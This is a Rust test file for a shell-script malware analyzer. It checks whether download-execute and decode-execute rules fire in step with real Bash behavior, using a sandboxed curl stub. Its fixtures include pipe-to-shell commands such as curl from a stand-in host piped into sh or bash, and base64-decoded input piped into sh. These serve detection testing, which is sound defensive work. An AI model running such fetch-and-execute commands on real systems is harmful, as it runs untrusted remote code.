//! Post-Stage-B hardening: flow invariants and fixed Bash differential cases.
//!
//! The differential table executes only repository-owned, side-effect-free
//! shell strings in a temporary directory. A local curl stub emits a shell
//! marker instead of making a network request; the analyzer still sees the
//! real curl command spelling and must agree with Bash about whether that
//! marker reaches an executing consumer.

use crate::detect::*;
use omasafe_core::bounds::TimeBudget;
use std::fs;
use std::path::Path;
use std::process::Command;
use tempfile::TempDir;

const DOWNLOAD: &str = "oma.script.download-execute";
const DECODE: &str = "oma.script.decode-execute";

fn entry(path: &str, source: &str) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind: PayloadKind::Shell,
        mode: 0o755,
        size: source.len() as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: true,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        object_id: None,
        invocation_target: false,
    }
}

fn rule_ids(source: &str) -> Vec<String> {
    let mut inventory = PayloadInventory {
        entries: vec![entry("case.sh", source)],
        ..Default::default()
    };
    let artifacts = analyze_inventory(
        &mut inventory,
        &|entry| (entry.relative_path == "case.sh").then(|| source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    artifacts
        .rendered_findings()
        .into_iter()
        .map(|finding| finding.rule_id)
        .collect()
}

fn has_rule(source: &str, rule: &str) -> bool {
    rule_ids(source).iter().any(|id| id == rule)
}

#[test]
fn shell_flow_invariants_hold_for_generated_cases() {
    let producers = ["curl https://example.test/payload", "base64 -d payload.b64"];
    let consumers = ["sh", "bash"];

    // A complete producer/consumer pair is the positive baseline. Redirects
    // that move producer stdout or consumer stdin away can only remove the
    // edge; they must never create one.
    for producer in producers {
        for consumer in consumers {
            let baseline = format!("{producer} | {consumer}");
            let stdout_away = format!("{producer} > captured | {consumer}");
            let stdin_away = format!("{producer} | {consumer} </dev/null");
            let rule = if producer.starts_with("curl") {
                DOWNLOAD
            } else {
                DECODE
            };
            assert!(has_rule(&baseline, rule), "baseline lost: {baseline}");
            assert!(
                !has_rule(&stdout_away, rule),
                "stdout redirect created an edge: {stdout_away}"
            );
            assert!(
                !has_rule(&stdin_away, rule),
                "stdin redirect created an edge: {stdin_away}"
            );
        }
    }

    // Short-circuited branches cannot add a producer, and a decoder's encode
    // mode is not interchangeable with its decode mode.
    for producer in producers {
        for branch in [
            format!("false && {producer} | sh"),
            format!("true || {producer} | sh"),
        ] {
            assert!(rule_ids(&branch).is_empty(), "dead branch fired: {branch}");
        }
    }
    assert!(has_rule("base64 -d payload.b64 | sh", DECODE));
    assert!(!has_rule("base64 -e payload.b64 | sh", DECODE));
    assert!(!has_rule(
        "curl https://example.test/payload | sh -n",
        DOWNLOAD
    ));
    assert!(!has_rule(
        "printf 'curl https://example.test/payload | sh'",
        DOWNLOAD
    ));
}

struct DifferentialCase {
    name: &'static str,
    source: &'static str,
    payload: bool,
    rule: &'static str,
}

#[test]
fn supported_shell_subset_matches_bash_marker_flow() {
    let cases = [
        DifferentialCase {
            name: "curl-pipe-sh",
            source: "curl https://example.test/payload | sh",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-stdout-away",
            source: "curl https://example.test/payload > captured | sh",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-cat-sh",
            source: "curl https://example.test/payload | cat | sh",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-parse-only",
            source: "curl https://example.test/payload | sh -n",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-stdin-script",
            source: "curl https://example.test/payload | bash -s",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-stdin-script-cluster",
            source: "curl https://example.test/payload | bash -sv",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-cluster-parse-only",
            source: "curl https://example.test/payload | bash -nv",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-plus-noexec",
            source: "curl https://example.test/payload | bash +n",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-static-c-body",
            source: "bash -c 'curl https://example.test/payload' | sh",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-dead-if",
            source: "if false; then curl https://example.test/payload | sh; fi",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-live-if",
            source: "if true; then curl https://example.test/payload | sh; fi",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-live-for",
            source: "for item in one; do curl https://example.test/payload | sh; done",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-empty-for",
            source: "for item in; do curl https://example.test/payload | sh; done",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "curl-case-selector-in",
            source: "case in in\n  in) curl https://example.test/payload | sh ;;\nesac",
            payload: false,
            rule: DOWNLOAD,
        },
        DifferentialCase {
            name: "decode-pipe-sh",
            source: "base64 -d payload.b64 | sh",
            payload: true,
            rule: DECODE,
        },
        DifferentialCase {
            name: "decode-stdout-away",
            source: "base64 -d payload.b64 > captured | sh",
            payload: true,
            rule: DECODE,
        },
        DifferentialCase {
            name: "decode-parse-only",
            source: "base64 -d payload.b64 | sh -n",
            payload: true,
            rule: DECODE,
        },
    ];

    let sandbox = TempDir::new().expect("differential sandbox");
    let bin = sandbox.path().join("bin");
    fs::create_dir(&bin).expect("stub bin");
    let curl = bin.join("curl");
    fs::write(&curl, "#!/bin/sh\nprintf ': > \"$MARKER\"\\n'\n").expect("curl stub");
    make_executable(&curl);
    fs::write(sandbox.path().join("payload.b64"), "OiA+ICIkTUFSS0VSIgo=").expect("decoder payload");

    for case in cases {
        let marker = sandbox.path().join(format!("{}.marker", case.name));
        let output = Command::new("/bin/bash")
            .arg("-c")
            .arg(case.source)
            .current_dir(sandbox.path())
            .env("MARKER", &marker)
            .env("PATH", format!("{}:/usr/bin:/bin", bin.display()))
            .output()
            .unwrap_or_else(|error| panic!("{}: Bash launch failed: {error}", case.name));
        assert!(
            output.status.success(),
            "{}: Bash failed: {}",
            case.name,
            String::from_utf8_lossy(&output.stderr)
        );
        let bash_reached = marker.exists();
        let analyzer_reached = has_rule(case.source, case.rule);
        assert_eq!(
            analyzer_reached, bash_reached,
            "{}: analyzer={} Bash={} source={:?}",
            case.name, analyzer_reached, bash_reached, case.source
        );
        if case.payload {
            assert!(sandbox.path().join("payload.b64").exists());
        }
        let _ = fs::remove_file(&marker);
    }
}

#[cfg(unix)]
fn make_executable(path: &Path) {
    use std::os::unix::fs::PermissionsExt;
    let mut permissions = fs::metadata(path).unwrap().permissions();
    permissions.set_mode(0o755);
    fs::set_permissions(path, permissions).unwrap();
}

#[cfg(not(unix))]
fn make_executable(_path: &Path) {}
